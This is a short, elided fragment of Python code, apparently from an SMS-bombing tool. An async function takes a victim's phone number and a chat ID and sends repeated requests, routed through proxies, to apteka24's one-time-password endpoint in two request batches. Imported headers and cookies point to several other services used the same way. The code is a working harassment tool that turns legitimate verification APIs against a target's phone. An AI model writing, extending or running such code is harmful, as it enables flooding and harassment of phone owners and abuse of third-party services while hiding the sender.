...
from headers_main import (
    ...
    cookies_elmir_call, headers_apteka24
)
import asyncpg
import config
import aiohttp
...
async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
    ...
    # Додаємо apteka24 в обидві пачки
    first_requests.append(bounded_request("https://ucb.z.apteka24.ua/api/send/otp", **with_proxy({"json": {"phone": number}, "headers": headers_apteka24})))
    second_requests.append(bounded_request("https://ucb.z.apteka24.ua/api/send/otp", **with_proxy({"json": {"phone": number}, "headers": headers_apteka24})))
